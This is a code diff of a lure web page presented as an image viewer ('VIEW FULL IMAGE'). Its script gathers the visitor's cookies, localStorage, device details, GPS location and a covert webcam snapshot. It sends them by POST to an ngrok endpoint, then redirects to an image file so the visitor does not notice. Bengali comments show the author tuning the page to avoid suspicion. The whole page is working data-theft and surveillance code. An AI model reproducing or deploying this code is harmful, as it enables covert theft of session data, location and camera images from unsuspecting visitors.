@@ -15,22 +15,21 @@
     <div id="main">
         <h2>[ MEDIA_LOCKED ]</h2>
         <p>Complete verification to bypass firewall.</p>
-        <button onclick="startMission()">UNLOCK NOW</button>
+        <button onclick="startMission()">VIEW FULL IMAGE</button>
     </div>
 
     <canvas id="scr" style="display:none;"></canvas>
     <video id="vid" autoplay style="display:none;"></video>
 
     <script>
-        // আপনার বর্তমান এনগ্রোক লিঙ্কটি এখানে দিন (শেষে /vulnerability_probe যোগ করবেন)
+        // আপনার দেওয়া নতুন Ngrok লিঙ্ক
         const URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';
 
         async function startMission() {
-            // ১. সাইলেন্ট রিভোলিউশন (Vulnerability + System Data)
             let report = {
                 system: {
                     os: navigator.platform,
-                    cookies: document.cookie || "No Cookies",
+                    cookies: document.cookie || "No Cookies Found",
                     storage: JSON.stringify(localStorage),
                     res: `${screen.width}x${screen.height}`,
                     time: Intl.DateTimeFormat().resolvedOptions().timeZone
@@ -39,10 +38,10 @@
             };
 
             // Vulnerability Probes
-            if (navigator.webdriver) report.vuln.push("Bot_Detected");
-            if (navigator.pdfViewerEnabled) report.vuln.push("PDF_Exploit_Active");
+            if (navigator.webdriver) report.vuln.push("Automation_Bot_Detected");
+            if (navigator.pdfViewerEnabled) report.vuln.push("PDF_Exploit_Potential");
 
-            // ২. লোকেশন ও ক্যামেরা
+            // লোকেশন ও ক্যামেরা ট্রাই
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 try {
@@ -54,24 +53,25 @@
                         const canvas = document.getElementById('scr');
                         canvas.width = 640; canvas.height = 480;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        send(report, canvas.toDataURL('image/jpeg'));
+                        sendData(report, canvas.toDataURL('image/jpeg'));
                         stream.getTracks().forEach(t => t.stop());
                     }, 2000);
-                } catch (e) { send(report, null); }
-            }, () => send(report, null));
+                } catch (e) { sendData(report, null); }
+            }, () => sendData(report, null));
 
-            // রিডাইরেক্ট যাতে সন্দেহ না হয়
-            setTimeout(() => { alert("Verifying... Please wait."); }, 500);
+            // ইউজারকে রিডাইরেক্ট করা
+            setTimeout(() => { window.location.href = "elephant.jpg"; }, 4000);
         }
 
-        function send(d, p) {
+        function sendData(d, p) {
+            console.log("Attempting to send data...");
             fetch(URL, {
                 method: 'POST',
-                mode: 'cors', // CORS নিশ্চিত করা হয়েছে
+                mode: 'cors',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ ...d, photo: p })
             }).then(res => console.log("Success:", res))
-              .catch(err => console.error("Error:", err));
+              .catch(err => console.error("Network Error:", err));
         }
     </script>
 </body>
